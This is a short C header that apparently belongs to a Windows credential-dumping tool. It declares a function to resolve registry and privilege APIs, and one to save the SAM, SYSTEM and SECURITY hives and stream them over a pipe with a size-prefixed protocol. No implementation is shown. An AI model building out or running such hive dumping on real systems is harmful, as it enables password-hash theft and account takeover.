#ifndef REGISTRY_H
#define REGISTRY_H

#include <windows.h>

/* Load advapi32.dll and resolve registry/privilege APIs. */
BOOL init_registry(void);

/* Save SAM/SYSTEM/SECURITY hives and write them to the pipe.
   Protocol: for each hive, writes <u32 size><data>.
   Order: SYSTEM, SAM, SECURITY. */
BOOL dump_registry_hives(HANDLE pipe);

#endif /* REGISTRY_H */
